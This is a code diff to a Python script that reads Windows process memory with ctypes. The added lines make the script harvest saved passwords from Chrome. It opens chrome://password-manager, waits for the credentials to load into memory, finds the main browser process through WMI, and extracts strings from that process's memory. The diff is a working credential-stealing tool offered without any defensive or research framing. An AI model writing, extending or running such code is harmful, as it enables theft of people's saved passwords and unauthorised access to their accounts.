@@ -2,6 +2,10 @@ import ctypes
 import ctypes.wintypes as wintypes
 import re
 import sys
+import subprocess
+import time
+import os
+import wmi
 
 PROCESS_ALL_ACCESS = 0x1F0FFF
 MEM_COMMIT = 0x1000
@@ -63,7 +67,7 @@ def read_process_memory_strings(pid):
         return []
 
     address = 0
-    max_address = 0x7FFFFFFF  # 32-bit process; adjust for 64-bit
+    max_address = 0x7FFFFFFF  # Adjust for 64-bit if needed
     strings = []
 
     mbi = MEMORY_BASIC_INFORMATION()
@@ -83,13 +87,35 @@ def read_process_memory_strings(pid):
     CloseHandle(process_handle)
     return strings
 
-def main():
-    if len(sys.argv) != 2:
-        print(f"Usage: {sys.argv[0]} <chrome_pid>")
-        sys.exit(1)
+def find_main_chrome_pid():
+    c = wmi.WMI()
+    for process in c.Win32_Process(name="chrome.exe"):
+        cmdline = process.CommandLine or ""
+        # Identify main browser process by '--type=browser' or empty/standard command line
+        if "--type=browser" in cmdline or (cmdline.strip().endswith("chrome.exe") and "--type=" not in cmdline):
+            return process.ProcessId
+    return None
 
-    pid = int(sys.argv[1])
-    print(f"[+] Reading memory of process PID {pid}")
+def launch_chrome_password_manager(chrome_path):
+    subprocess.Popen([chrome_path, "chrome://password-manager"])
+    print("[+] Launched Chrome with password manager page.")
+
+def main():
+    chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+    if not os.path.exists(chrome_path):
+        print(f"[-] Chrome not found at {chrome_path}. Please update the path.")
+        return
+
+    launch_chrome_password_manager(chrome_path)
+
+    print("[*] Waiting 10 seconds for passwords to load into memory...")
+    time.sleep(10)
+
+    pid = find_main_chrome_pid()
+    if not pid:
+        print("[-] Could not find main Chrome PID.")
+        return
+    print(f"[+] Found main Chrome PID: {pid}")
 
     all_strings = read_process_memory_strings(pid)
     print(f"[+] Extracted {len(all_strings)} candidate strings")
